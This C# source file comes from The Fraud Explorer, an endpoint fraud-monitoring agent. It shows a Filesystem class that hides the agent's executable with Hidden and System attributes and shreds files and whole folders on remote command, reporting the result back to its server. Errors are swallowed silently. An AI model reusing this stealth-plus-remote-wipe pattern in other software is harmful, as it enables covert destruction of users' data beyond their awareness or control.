/*
 * The Fraud Explorer
 * http://www.thefraudexplorer.com/
 *
 * Copyright (c) 2017 The Fraud Explorer
 * email: support@thefraudexplorer.com
 * Licensed under GNU GPL v3
 * http://www.thefraudexplorer.com/License
 *
 * Date: 2017-04
 * Revision: v0.9.9-beta
 *
 * Description: Filesystem
 */

using System;
using System.IO;
using System.Threading;
using TFE_core.Networking;

namespace TFE_core.Config
{
    class Filesystem
    {
        /// <summary>
        /// Filesystem class constructor
        /// </summary>

        #region Filesystem constructor

        private string path;

        public Filesystem(string filename)
        {
            path = filename;
        }

        #endregion

        /// <summary>
        /// Copy files
        /// </summary>

        #region Copy files

        public void CopyTo(string newFilename)
        {
            try
            {
                System.IO.File.Copy(path, newFilename, true);
            }
            catch {};
        }

        #endregion

        /// <summary>
        /// Protect and hide executable
        /// </summary>

        #region Protect executable

        public void Protect()
        {
            try
            {
                FileInfo info = new FileInfo(path);
                info.Attributes = info.Attributes | FileAttributes.Hidden | FileAttributes.System;
            }
            catch { }
        }

        #endregion

       
        /// <summary>
        /// Wipe files and directories
        /// </summary>

        #region Wipe files an directories

        private readonly Shredder wipeF = new Shredder();
        public static string Wipe_filename = String.Empty;
        private void StartWipeFile() { wipeF.WipeFile(0, Wipe_filename, 7); }

        public void ShreddFile(string command, string uniqueID, string file)
        {
            Wipe_filename = file;
            Thread wipeThread = new Thread(StartWipeFile);
            wipeThread.Start();
            Network.SendData("shredded!", command, uniqueID, 1);
        }

        public void ShreddFolder(string command, string uniqueID, string folder)
        {
            try
            {
                if (System.IO.Directory.Exists(@folder))
                {
                    var allFilesToDelete = Directory.EnumerateFiles(@folder, "*.*", SearchOption.AllDirectories);
                    Shredder wipeD = new Shredder();
                    foreach (var file in allFilesToDelete) wipeD.WipeFile(0,file,7);
                    System.IO.Directory.Delete(@folder, true);
                }
                Network.SendData("shredded!", command, uniqueID, 1);
            } 
            catch {};
        }

        #endregion
    }
}
